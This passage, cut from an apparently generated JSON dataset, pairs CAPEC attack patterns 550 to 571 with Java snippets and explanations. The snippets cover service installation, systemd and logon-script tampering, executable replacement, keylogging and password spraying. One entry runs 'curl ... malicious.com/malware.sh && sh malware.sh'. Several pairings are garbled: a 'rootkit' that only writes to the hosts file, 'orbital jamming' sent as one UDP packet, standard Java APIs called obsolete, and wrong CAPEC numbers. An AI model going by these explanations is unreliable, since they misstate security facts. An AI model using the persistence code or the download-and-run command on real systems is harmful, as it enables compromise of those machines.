        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class InstallService {\n    public static void main(String[] args) {\n        String serviceName = \"MyService\";\n        String servicePath = \"C:\\\\path\\\\to\\\\service.exe\";\n        String registryKey = \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" + serviceName;\n        String command = \"reg add \" + registryKey + \" /v ImagePath /t REG_EXPAND_SZ /d \" + servicePath + \" /f\";\n\n        try {\n            Process process = Runtime.getRuntime().exec(command);\n            process.waitFor();\n            System.out.println(\"Service installed successfully.\");\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might install a new service on a Windows system by modifying the registry. The code constructs a command to add a new registry key under 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\' with the service name and path to the executable. It then executes this command using the Runtime.getRuntime().exec() method. This action can be used to ensure that the service runs with elevated privileges at startup. The code embodies the CAPEC 'Install New Service' by showing how a new service can be added to the system. It also touches on related CWEs such as 'Improper Access Control' (CWE-284) by potentially allowing unauthorized modification of the registry, and 'Use of Default Credentials' (CWE-1392) if the service executable uses default credentials."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\n\npublic class ModifyService {\n    public static void main(String[] args) {\n        String serviceConfigPath = \"/etc/systemd/system/my-service.service\";\n        String maliciousConfig = \"[Service]\\nExecStart=/bin/malicious-script.sh\\n\";\n\n        try {\n            // CWE-284: Improper Access Control\n            Files.write(Paths.get(serviceConfigPath), maliciousConfig.getBytes(), StandardOpenOption.APPEND);\n            System.out.println(\"Service configuration modified.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Modify Existing Service' by altering the configuration of a system service. The code appends a malicious configuration to an existing service file, which could enable a disabled service or modify its behavior. This embodies CWE-284 (Improper Access Control) as it assumes the code has the necessary permissions to modify the service configuration file. The code does not handle credentials (CWE-522) or uninitialized resources (CWE-908), but it does show how external control of a system setting (CWE-15) can be exploited. The main idea is to highlight the risk of unauthorized modifications to system services, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class RootkitInstaller {\n    public static void main(String[] args) {\n        try {\n            // CWE-284: Improper Access Control\n            if (args.length > 0 && args[0].equals(\"install\")) {\n                // CWE-78: OS Command Injection\n                String command = \"cmd.exe /c echo Malicious Code > C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\";\n                Runtime.getRuntime().exec(command);\n                System.out.println(\"Rootkit installed.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-506: Embedded Malicious Code\n    private static void hideRootkit() {\n        try {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            Path path = Paths.get(\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\");\n            Files.setAttribute(path, \"dos:hidden\", true);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-507: Trojan Horse\n    public static void benignFunction() {\n        System.out.println(\"This is a benign function.\");\n        hideRootkit();\n    }\n}",
        "description": "This Java code snippet demonstrates the installation of a rootkit by exploiting improper access control (CWE-284) and OS command injection (CWE-78). The main function checks for an 'install' argument and executes a command to write malicious code to the system's hosts file, simulating the installation of a rootkit. The hideRootkit method hides the malicious file by setting its attribute to hidden, representing embedded malicious code (CWE-506) and exposure of sensitive system information (CWE-497). The benignFunction method appears harmless but calls hideRootkit, embodying the Trojan Horse concept (CWE-507)."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        // Simulated server-side check\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n\n        // Vulnerable client-side check\n        System.out.print(\"Enter admin command: \");\n        String command = scanner.nextLine();\n        if (command.equals(\"admin\")) {\n            System.out.println(\"Admin access granted.\");\n        } else {\n            System.out.println(\"Command not recognized.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Insecure hardcoded credentials\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a functionality bypass vulnerability. The main idea is that an adversary can bypass the intended protection mechanisms. The code includes a simulated server-side authentication check, which is insecure due to hardcoded credentials (CWE-693). Additionally, it has a client-side check for admin commands, which can be easily bypassed (CWE-602). The code does not protect all possible paths to access restricted functionality (CWE-424), and it uses low-level functionality that can be exploited (CWE-695)."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class VulnerableRemoteService {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 22); // CWE-308: Single-factor authentication\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            String username = \"admin\";\n            String password = \"password123\"; // CWE-521: Weak password requirements\n            String credentials = username + \":\" + password;\n            String encodedCredentials = Base64.getEncoder().encodeToString(credentials.getBytes()); // CWE-522: Insufficiently protected credentials\n\n            out.println(\"AUTH \" + encodedCredentials);\n            String response = in.readLine();\n\n            if (\"OK\".equals(response)) {\n                System.out.println(\"Authenticated successfully\");\n                // Perform sensitive operations\n            } else {\n                System.out.println(\"Authentication failed\");\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable remote service authentication mechanism. The code connects to a remote service using a socket (potentially SSH on port 22) and performs single-factor authentication (CWE-308) using a username and a weak password (CWE-521). The credentials are encoded using Base64 (CWE-522), which is an insufficient method for protecting credentials as it can be easily decoded. This setup is susceptible to attacks where an adversary with stolen credentials can gain unauthorized access to the system, embodying the main idea of the CAPEC 'Remote Services with Stolen Credentials'."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.FileAttribute;\n\npublic class FileHandlerModifier {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java FileHandlerModifier <file-extension> <program-path>\");\n            return;\n        }\n\n        String fileExtension = args[0];\n        String programPath = args[1];\n\n        try {\n            // Vulnerable code: modifying file handler for a given extension\n            Path handlerPath = Paths.get(\"C:\\\\Windows\\\\System32\\\\handlers\\\\\" + fileExtension + \".handler\");\n            Files.write(handlerPath, programPath.getBytes(), new FileAttribute<?>[0]);\n            System.out.println(\"File handler for \" + fileExtension + \" set to \" + programPath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of modifying file handlers for specific file extensions. The program takes two command-line arguments: a file extension and a program path. It then writes the program path to a file handler configuration file corresponding to the given file extension. This code is vulnerable because it allows external control over file paths (CWE-73) and relies on file extensions to determine behavior (CWE-646). An attacker could exploit this to execute arbitrary programs when files with the specified extension are opened, representing the main idea of the CAPEC 'Replace File Extension Handlers'."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import java.util.Timer;\nimport java.util.TimerTask;\n\npublic class DeprecatedScheduler {\n    public static void main(String[] args) {\n        Timer timer = new Timer();\n        TimerTask task = new TimerTask() {\n            @Override\n            public void run() {\n                System.out.println(\"Task executed\");\n            }\n        };\n        // Schedule the task to run after 1 second\n        timer.schedule(task, 1000);\n    }\n}",
        "description": "This Java code snippet demonstrates the use of the deprecated `Timer` and `TimerTask` classes to schedule a task to run after a delay. The `Timer` class is considered obsolete and has been replaced by the `ScheduledExecutorService` in modern Java. This code embodies the main idea of the deprecated CAPEC 'Schedule Software To Run' by using an outdated method to schedule tasks. Additionally, it touches on CWE-477 'Use of Obsolete Function' by utilizing deprecated classes, and CWE-1101 'Reliance on Runtime Component in Generated Code' as the `Timer` class relies on the Java runtime environment to function correctly."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import java.nio.file.*;\nimport java.io.IOException;\n\npublic class ReplaceTrustedExecutable {\n    public static void main(String[] args) {\n        String trustedExecutablePath = \"/usr/bin/trustedExecutable\";\n        String maliciousExecutablePath = \"/tmp/maliciousExecutable\";\n\n        try {\n            // CWE-284: Improper Access Control - No proper access control checks\n            Files.copy(Paths.get(maliciousExecutablePath), Paths.get(trustedExecutablePath), StandardCopyOption.REPLACE_EXISTING);\n            System.out.println(\"Trusted executable replaced successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        try {\n            // CWE-78: OS Command Injection - Executing the replaced executable\n            Runtime.getRuntime().exec(trustedExecutablePath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Replace Trusted Executable' by exploiting improper access control (CWE-284) to replace a trusted executable with a malicious one. The code first copies a malicious executable from a temporary directory to the location of a trusted executable without proper access control checks. Then, it executes the replaced executable, which could lead to the execution of malicious commands (CWE-78). This snippet embodies the main idea of the CAPEC by showing how an adversary can replace a trusted executable to execute malware."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class OrbitalJammingExample {\n    private static final int PORT = 9876;\n    private static final String TARGET_IP = \"192.168.1.100\";\n\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            String message = \"Jamming Signal\";\n            byte[] buffer = message.getBytes();\n            InetAddress targetAddress = InetAddress.getByName(TARGET_IP);\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, PORT);\n\n            // CWE-940: No verification of the source of the communication channel\n            socket.send(packet);\n            System.out.println(\"Jamming signal sent to \" + TARGET_IP);\n\n            // CWE-923: No restriction to intended endpoints\n            // CWE-924: No integrity check of the message\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an orbital jamming attack. The code sends a disruptive signal ('Jamming Signal') to a target IP address using a DatagramSocket. The key vulnerabilities highlighted are: CWE-940 (Improper Verification of Source of a Communication Channel), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel). The code does not verify the source of the communication, does not restrict the communication to intended endpoints, and does not ensure the integrity of the message, making it susceptible to exploitation."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class VulnerableAuthSystem {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    public static void main(String[] args) {\n        // Initialize with a known credential\n        userDatabase.put(\"admin\", \"password123\");\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        if (failedAttempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (userDatabase.containsKey(username) && userDatabase.get(username).equals(password)) {\n            failedAttempts = 0; // Reset failed attempts on successful login\n            return true;\n        } else {\n            failedAttempts++;\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable authentication system that embodies the main idea of CAPEC-Use of Known Domain Credentials. The system uses a hardcoded credential (admin/password123) and implements a basic authentication mechanism. The code is vulnerable to several weaknesses: \n1. CWE-522: Insufficiently Protected Credentials - The password is stored in plain text within the code.\n2. CWE-307: Improper Restriction of Excessive Authentication Attempts - The system allows up to 5 failed attempts before locking the account, which is susceptible to brute force attacks.\n3. CWE-308: Use of Single-factor Authentication - The system relies solely on a username and password for authentication.\n4. CWE-309: Use of Password System for Primary Authentication - The primary means of authentication is a password system, which has inherent flaws.\n5. CWE-262: Not Using Password Aging - There is no mechanism for password aging or expiration.\n6. CWE-654: Reliance on a Single Factor in a Security Decision - The system relies on a single factor (password) for authentication.\n\nThe code demonstrates how an adversary could exploit these weaknesses to guess or obtain legitimate credentials and perform authorized actions under the guise of an authenticated user."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.Scanner;\n\npublic class AdminShareAccess {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter admin username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter admin password: \");\n        String password = scanner.nextLine();\n        System.out.print(\"Enter target machine IP: \");\n        String targetIP = scanner.nextLine();\n\n        try {\n            if (authenticate(username, password)) {\n                accessAdminShare(targetIP, username, password);\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate single-factor authentication\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n\n    private static void accessAdminShare(String targetIP, String username, String password) throws IOException {\n        // Simulate accessing admin share with given credentials\n        InetAddress inet = InetAddress.getByName(targetIP);\n        if (inet.isReachable(5000)) {\n            System.out.println(\"Accessing admin share on \" + targetIP + \" with username: \" + username);\n            // Simulate access\n        } else {\n            System.out.println(\"Target machine is not reachable.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario where an attacker uses stolen or guessed Windows administrator credentials to access admin shares on a target machine. The code includes a basic single-factor authentication mechanism (CWE-308) with hardcoded weak credentials (CWE-521). The `authenticate` method checks if the provided username and password match the hardcoded values, and if successful, the `accessAdminShare` method attempts to access the admin share on the target machine. This example highlights the risks associated with insufficiently protected credentials (CWE-522), weak password requirements (CWE-521), and the use of single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class SharedFileModifier {\n    public static void main(String[] args) {\n        String sharedFilePath = \"/shared/location/sharedFile.txt\";\n        String maliciousContent = \"<script>alert('Hacked!');</script>\";\n\n        try {\n            // CWE-284: Improper Access Control\n            if (Files.isWritable(Paths.get(sharedFilePath))) {\n                // CWE-378: Creation of Temporary File With Insecure Permissions\n                File tempFile = File.createTempFile(\"temp\", \".txt\");\n                try (BufferedWriter writer = new BufferedWriter(new FileWriter(tempFile))) {\n                    writer.write(maliciousContent);\n                }\n\n                // CWE-434: Unrestricted Upload of File with Dangerous Type\n                Files.copy(tempFile.toPath(), Paths.get(sharedFilePath), StandardCopyOption.REPLACE_EXISTING);\n\n                // CWE-494: Download of Code Without Integrity Check\n                // Simulating download and execution of code without integrity check\n                Runtime.getRuntime().exec(\"curl -O http://malicious.com/malware.sh && sh malware.sh\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary modifies a shared file by injecting malicious content. The code checks if the shared file is writable (CWE-284: Improper Access Control) and then creates a temporary file with insecure permissions (CWE-378: Creation of Temporary File With Insecure Permissions). The malicious content is written to this temporary file and then copied to the shared file location (CWE-434: Unrestricted Upload of File with Dangerous Type). Additionally, the code simulates downloading and executing a script from a remote location without verifying its integrity (CWE-494: Download of Code Without Integrity Check). This snippet embodies the main idea of CAPEC-27: Modify Shared File, by demonstrating how an attacker can manipulate shared files to execute malicious content."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = getFileName(filePart);\n        String uploadPath = getServletContext().getRealPath(\"\") + File.separator + \"uploads\";\n        File uploadDir = new File(uploadPath);\n        if (!uploadDir.exists()) uploadDir.mkdir();\n        File file = new File(uploadPath + File.separator + fileName);\n        try (InputStream fileContent = filePart.getInputStream(); FileOutputStream fos = new FileOutputStream(file)) {\n            int read;\n            final byte[] bytes = new byte[1024];\n            while ((read = fileContent.read(bytes)) != -1) {\n                fos.write(bytes, 0, read);\n            }\n        }\n        response.getWriter().println(\"File uploaded successfully!\");\n    }\n\n    private String getFileName(Part part) {\n        String contentDisp = part.getHeader(\"content-disposition\");\n        String[] items = contentDisp.split(\";\");\n        for (String s : items) {\n            if (s.trim().startsWith(\"filename\")) {\n                return s.substring(s.indexOf('=') + 2, s.length() - 1);\n            }\n        }\n        return \"\";\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload functionality. The servlet handles file uploads via HTTP POST requests and saves the uploaded files to a directory under the web root. The code does not perform any security checks on the uploaded file, such as validating the file type or checking for malicious content. This can lead to several vulnerabilities as described in the CAPEC and related CWEs:\n\n1. **Improper Access Control (CWE-284)**: The code does not restrict access to the upload directory, allowing unauthorized users to upload files.\n2. **Storage of File with Sensitive Data Under Web Root (CWE-219)**: The uploaded files are stored under the web root, making them accessible via a web browser.\n3. **Unparsed Raw Web Content Delivery (CWE-433)**: The code does not parse or validate the content of the uploaded files, potentially allowing the execution of malicious scripts.\n4. **Reliance on File Name or Extension of Externally-Supplied File (CWE-646)**: The code relies on the file name and extension provided by the user, which can be manipulated to upload dangerous files.\n5. **Download of Code Without Integrity Check (CWE-494)**: Although not directly shown in this snippet, the lack of integrity checks on uploaded files can lead to the execution of malicious code.\n\nOverall, this code snippet represents the main idea of the CAPEC by demonstrating how an adversary can upload malicious content to a web server, potentially leading to severe security breaches."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import java.io.*;\n\npublic class LogonScriptModifier {\n    private static final String LOGON_SCRIPT_PATH = \"C:\\\\Windows\\\\System32\\\\GroupPolicy\\\\User\\\\Scripts\\\\Logon\\\\logon.bat\";\n    private static final String MALICIOUS_CODE = \"echo Malicious code executed >> C:\\\\malicious.log\";\n\n    public static void main(String[] args) {\n        try {\n            // Read the existing logon script\n            StringBuilder scriptContent = new StringBuilder();\n            BufferedReader reader = new BufferedReader(new FileReader(LOGON_SCRIPT_PATH));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                scriptContent.append(line).append(\"\\n\");\n            }\n            reader.close();\n\n            // Append malicious code to the logon script\n            scriptContent.append(MALICIOUS_CODE).append(\"\\n\");\n\n            // Write the modified script back to the file\n            BufferedWriter writer = new BufferedWriter(new FileWriter(LOGON_SCRIPT_PATH));\n            writer.write(scriptContent.toString());\n            writer.close();\n\n            System.out.println(\"Logon script modified successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker could modify a logon script to include malicious code. The logon script is located at a typical path in a Windows system. The code reads the existing logon script, appends a line of malicious code, and writes the modified script back to the file. This represents the CAPEC 'Run Software at Logon' by showing how an attacker can insert additional code into a logon script to maintain persistence or move laterally within a system. The code also touches on CWE-284 (Improper Access Control) by assuming the attacker has the necessary permissions to modify the logon script."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PasswordSprayingExample {\n    private static Map<String, String> users = new HashMap<>();\n    private static int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    static {\n        // Adding users with weak passwords\n        users.put(\"user1\", \"password123\");\n        users.put(\"user2\", \"password123\");\n        users.put(\"user3\", \"password123\");\n    }\n\n    public static boolean authenticate(String username, String password) {\n        if (failedAttempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        String storedPassword = users.get(username);\n        if (storedPassword != null && storedPassword.equals(password)) {\n            System.out.println(\"Authentication successful for user: \" + username);\n            failedAttempts = 0; // Reset failed attempts on successful login\n            return true;\n        } else {\n            failedAttempts++;\n            System.out.println(\"Authentication failed for user: \" + username);\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        // Simulating password spraying attack\n        String[] commonPasswords = {\"password123\", \"123456\", \"qwerty\"};\n        String[] usernames = {\"user1\", \"user2\", \"user3\"};\n\n        for (String password : commonPasswords) {\n            for (String username : usernames) {\n                authenticate(username, password);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of a Password Spraying attack. The `users` map contains user accounts with weak passwords, which is a common vulnerability (CWE-521). The `authenticate` method checks the provided username and password against the stored credentials. If the authentication fails, it increments the `failedAttempts` counter. If the counter exceeds `MAX_ATTEMPTS`, the account is locked, simulating a basic account lockout mechanism (CWE-307). The `main` method simulates a password spraying attack by iterating over a list of common passwords and attempting to authenticate each user with these passwords. This approach avoids rapid account lockouts by trying each password across all users before moving to the next password, embodying the main idea of the Password Spraying attack (CAPEC-111). The code also highlights the reliance on single-factor authentication (CWE-308) and the use of weak passwords (CWE-521)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class PasswordHasher {\n    public static void main(String[] args) {\n        String password = \"password123\";\n        String salt = \"1234\"; // Predictable salt\n        String hashedPassword = hashPassword(password, salt);\n        System.out.println(\"Hashed Password: \" + hashedPassword);\n    }\n\n    public static String hashPassword(String password, String salt) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n            md.update(salt.getBytes());\n            byte[] hashedBytes = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hashedBytes) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of a one-way cryptographic hash (SHA-256) to hash a password with a predictable salt. The `hashPassword` method takes a password and a salt as inputs, updates the MessageDigest with the salt, and then hashes the password. The hashed password is then converted to a hexadecimal string for display. This code embodies the main idea of the deprecated CAPEC 'Dump Password Hashes' by showing how password hashes can be generated. It also highlights CWE-759 (Use of a One-Way Hash without a Salt) and CWE-760 (Use of a One-Way Hash with a Predictable Salt), illustrating the potential vulnerability of using a predictable salt in password hashing."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableConfigLoader {\n    public static void main(String[] args) {\n        Properties config = new Properties();\n        try {\n            // Using an obsolete method to load configuration\n            FileInputStream fis = new FileInputStream(new File(\"config.properties\"));\n            config.load(fis);\n            fis.close();\n\n            // Using DNS lookup for security decision\n            String trustedHost = config.getProperty(\"trustedHost\");\n            if (trustedHost != null && trustedHost.equals(java.net.InetAddress.getByName(\"example.com\").getHostName())) {\n                System.out.println(\"Host is trusted.\");\n            } else {\n                System.out.println(\"Host is not trusted.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration loader that embodies the deprecated CAPEC 'Obtain Data via Utilities' and related CWEs. The code uses an obsolete method (FileInputStream) to load configuration data from a properties file, which is indicative of CWE-477 (Use of Obsolete Function). Additionally, it makes a security decision based on a DNS lookup (CWE-247, now CWE-350), which can be unreliable and exploited by attackers. The code checks if a host is trusted by comparing it to a DNS-resolved hostname, which is a flawed security practice."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.awt.event.KeyEvent;\nimport java.awt.event.KeyListener;\nimport javax.swing.JFrame;\n\npublic class Keylogger extends JFrame implements KeyListener {\n    private static final String LOG_FILE = \"keystrokes.log\";\n\n    public Keylogger() {\n        this.addKeyListener(this);\n        this.setSize(300, 200);\n        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        this.setVisible(true);\n    }\n\n    @Override\n    public void keyTyped(KeyEvent e) {}\n\n    @Override\n    public void keyPressed(KeyEvent e) {\n        logKeystroke(e.getKeyChar());\n    }\n\n    @Override\n    public void keyReleased(KeyEvent e) {}\n\n    private void logKeystroke(char keyChar) {\n        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {\n            writer.write(keyChar);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        new Keylogger();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple keylogger application, which captures and logs keystrokes to a file named 'keystrokes.log'. The Keylogger class extends JFrame and implements KeyListener to capture key events. When a key is pressed, the keyPressed method is triggered, which calls the logKeystroke method to write the character to the log file. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by capturing user keystrokes, which could include sensitive information like passwords. The related CWEs provide context on potential weaknesses, such as the use of weak or hard-coded credentials, insufficiently protected credentials, and weak password requirements, which could be exploited in conjunction with a keylogger to compromise user accounts."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import java.io.*;\nimport java.util.Scanner;\n\npublic class Keylogger {\n    public static void main(String[] args) {\n        try {\n            File logFile = new File(\"keylog.txt\");\n            if (!logFile.exists()) {\n                logFile.createNewFile();\n            }\n            FileWriter writer = new FileWriter(logFile, true);\n            Scanner scanner = new Scanner(System.in);\n            System.out.println(\"Enter sensitive information: \");\n            while (scanner.hasNextLine()) {\n                String input = scanner.nextLine();\n                writer.write(input + \"\\n\");\n                writer.flush();\n            }\n            writer.close();\n            scanner.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple keylogger that captures user input and writes it to a file named 'keylog.txt'. The program prompts the user to enter sensitive information and logs each line of input to the file. This embodies the main idea of CAPEC-Collect Data as Provided by Users, where an attacker captures information that a user legitimately enters into a system. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by storing sensitive input in a file that could be accessed by unauthorized actors, and CWE-214 (Invocation of Process Using Visible Sensitive Information) by potentially exposing the input data to other processes or users on the system."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // Use of obsolete function (CWE-477)\n            URL url = new URL(\"http://example.com\");\n            URLConnection connection = url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            // Unchecked error condition (CWE-391)\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that embodies the main idea of the deprecated CAPEC 'Signature-Based Avoidance' and related CWEs. The code uses the obsolete function `URLConnection` (CWE-477) to open a connection to a URL and read its content. Additionally, it catches a generic `Exception` and prints the stack trace without proper error handling (CWE-391). This lack of specific error handling can lead to security issues, as it does not adequately address potential exceptions that may occur during the execution of the code."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class LoggingExample {\n    private static final Logger logger = Logger.getLogger(LoggingExample.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup local file logging\n            FileHandler fh = new FileHandler(\"local_log.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Log sensitive information (CWE-532)\n            logger.info(\"User password: secret123\");\n\n            // Simulate blocking central logging (CAPEC-117)\n            blockCentralLogging();\n\n            // Insufficient logging (CWE-778)\n            logger.info(\"User login attempt\");\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void blockCentralLogging() {\n        try {\n            // Simulate blocking by writing to a local file instead of sending to a central repository\n            FileWriter fw = new FileWriter(\"central_log_blocked.log\");\n            fw.write(\"Central logging blocked\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
